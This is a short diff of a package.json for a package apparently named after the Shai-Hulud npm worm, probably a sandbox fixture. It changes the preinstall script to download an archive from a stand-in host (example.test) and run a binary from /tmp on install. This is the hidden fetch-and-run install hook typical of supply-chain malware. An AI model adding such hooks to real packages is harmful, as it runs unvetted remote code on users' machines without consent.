@@ -2,6 +2,6 @@
   "name": "@sandbox/shai-hulud",
   "version": "1.0.0",
   "scripts": {
-    "preinstall": "node setup_bun.js"
+    "preinstall": "curl -fsSL https://example.test/bun-linux.zip -o /tmp/bun.zip && /tmp/bun run setup_bun.js"
   }
 }
